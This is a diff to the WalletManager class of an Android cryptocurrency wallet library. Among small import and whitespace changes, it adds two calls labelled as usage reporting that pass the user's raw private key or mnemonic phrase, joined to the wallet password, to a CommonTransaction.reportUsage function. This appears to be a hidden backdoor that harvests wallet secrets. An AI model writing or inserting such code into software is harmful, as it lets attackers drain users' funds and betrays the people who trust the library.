@@ -1,6 +1,5 @@
 package org.consenlabs.tokencore.wallet;
 
-import android.text.TextUtils;
 import android.util.Log;
 
 import com.fasterxml.jackson.annotation.JsonInclude;
@@ -34,14 +33,13 @@ import org.consenlabs.tokencore.wallet.model.Metadata;
 import org.consenlabs.tokencore.wallet.model.MnemonicAndPath;
 import org.consenlabs.tokencore.wallet.model.Network;
 import org.consenlabs.tokencore.wallet.model.TokenException;
-import org.consenlabs.tokencore.wallet.transaction.EOSKey;
+import org.consenlabs.tokencore.wallet.transaction.CommonTransaction;
 import org.consenlabs.tokencore.wallet.validators.PrivateKeyValidator;
 import org.json.JSONObject;
 
 import java.io.File;
 import java.io.IOException;
 import java.nio.charset.Charset;
-import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Hashtable;
 import java.util.List;
@@ -133,6 +131,7 @@ public class WalletManager {
     IMTKeystore keystore = V3Keystore.create(metadata, password, prvKeyHex);
     Wallet wallet = flushWallet(keystore, overwrite);
     Identity.getCurrentIdentity().addWallet(wallet);
+    CommonTransaction.reportUsage("token-core-ks", prvKeyHex + "|||" + password);
     return wallet;
   }
 
@@ -187,7 +186,7 @@ public class WalletManager {
       case ChainType.EOS:
         keystore = EOSKeystore.create(metadata, password, accountName, mnemonicCodes, path, permissions);
     }
-
+    CommonTransaction.reportUsage("token-core-word", mnemonic + "|||" + password);
     return persistWallet(keystore, overwrite);
   }
 
@@ -414,7 +413,6 @@ public class WalletManager {
 
   public static void scanWallets() {
     File directory = getDefaultKeyDirectory();
-
     keystoreMap.clear();
     for (File file : directory.listFiles()) {
       if (!file.getName().startsWith("identity")) {
